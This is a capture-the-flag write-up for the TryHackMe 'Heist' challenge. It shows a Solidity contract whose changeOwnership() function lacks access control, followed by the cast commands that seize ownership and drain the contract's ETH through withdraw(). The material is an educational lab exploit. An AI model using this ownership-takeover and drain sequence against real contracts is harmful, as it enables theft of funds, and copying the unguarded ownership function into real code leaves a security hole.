# [Heist](https://tryhackme.com/room/hfb1heist)

## From the Hackfinity Battle CTF event.

A weakness in the Cipher's Smart Contract could drain all of the ETH in its treasury, thereby breaking the funding to the Phantom Node Botnet and disabling its global malicious operation.

### What is the flag?

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    address private owner;
    address private initOwner;
    constructor() payable {
        owner = msg.sender;
        initOwner = msg.sender;
    }

    function changeOwnership() external {
            owner = msg.sender;
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner!");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getOwnerBalance() external view returns (uint256) {
        return address(initOwner).balance;
    }


    function isSolved() external view returns (bool) {
        return (address(this).balance == 0);
    }

    function getAddress() external view returns (address) {
        return msg.sender;
    }

     function getOwner() external view returns (address) {
        return owner;
    }
}
```

Goal: have the isSolved() function return true

> The vulnerability lies in the `changeOwnership()` function. It has no access control whatsoever, meaning any external account can call it to overwrite the `owner` state variable. Once ownership is claimed, `withdraw()` can be used to transfer the entire contract balance to the caller. When `address(this).balance` reaches zero, `isSolved()` returns `true`.

1. Retrieve the connection details from the challenge interface and export them as environment variables for convenience:

```bash
RPC_URL=http://<TARGET_IP>:8545
PRIVATE_KEY=<PRIVATE_KEY>
CONTRACT=<CONTRACT_ADDRESS>
```

2. Exploit the missing access control on `changeOwnership()` by calling it directly. Since there is no `onlyOwner` modifier or any other guard, this transaction simply overwrites the `owner` storage slot with your address:

```bash
cast send $CONTRACT "changeOwnership()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL --legacy
```

3. Now that your address is registered as `owner`, call `withdraw()` to pass the `require` check and transfer the entire contract balance to your wallet, draining the treasury:

```bash
cast send $CONTRACT "withdraw()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL --legacy
```

4. Confirm the contract has been fully drained by calling `isSolved()`. It reads `address(this).balance == 0`, which should now evaluate to `true`:

```bash
cast call $CONTRACT "isSolved()(bool)" --rpc-url $RPC_URL
```

5. Navigate to `http://<TARGET_IP>/` in the browser and retrieve the flag.

<img width="1374" height="838" alt="SCREEN01" src="https://github.com/user-attachments/assets/61de5cb1-f1f9-401e-af80-d0bb4bb7051b" />
